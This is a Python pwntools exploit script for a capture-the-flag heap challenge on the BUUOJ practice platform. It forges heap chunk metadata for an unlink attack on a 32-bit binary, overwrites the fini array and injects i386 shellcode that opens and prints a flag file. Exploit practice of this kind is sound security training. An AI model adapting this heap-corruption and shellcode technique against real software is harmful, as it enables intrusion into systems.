#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/30 16:48:38
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'i386'
file_name = "./pwn"
menu = ""
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    # libc_path = "../../libc/16-64-libc-2.23.so"
    # one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
else:
    # libc_path = "../../libc/16-32-libc-2.23.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 29297
    sh = remote(IP,port)
elf = ELF(file_name)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sleep(0.1)
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sleep(0.1)
    sh.sendline(str(size))
    sleep(0.1)
    sh.sendline(content)

def edit(idx,content):
    cmd(3)
    sleep(0.1)
    sh.sendline(str(idx))
    sleep(0.1)
    sh.send(content)
def dele(idx):
    cmd(2)
    sleep(0.1)
    sh.sendline(str(idx))

ptr = 0x80eba40+4*4
add(0x80,'a')
add(0x80,'a')
add(0x80,'a')
add(0x24,'a')
add(0x24,'a')
add(0x8c,'a')
add(0x10,'a')
edit(4,'a'*0x24)
payload = 'aaaa' + p32(0x21) + p32(ptr-0xc) + p32(ptr-0x8)
payload = payload.ljust(0x20,'\0')
payload +=  p32(0x20) + "\x90"
edit(4,payload)
dele(5)
edit(4,p32(0x80eba40)+"\n")

fini = 0x080e9f74

edit(1,p32(0x080ebab5)+p32(fini)+"\n")
shellcode ='''
mov eax,0x6761
push eax
mov eax,0x6c662f2e
push eax
mov ebx,esp
xor ecx,ecx
xor edx,edx
mov eax,5
int 0x80

mov ebx,3
mov ecx,0x080ebd84
mov edx,0x30
mov eax,3
int 0x80

mov ebx,1
mov eax,4
int 0x80
'''
payload = asm(shellcode)
edit(0,payload+"\n")
edit(1,p32(0x080ebab5)*2)
# debug()
cmd(4)
sh.interactive()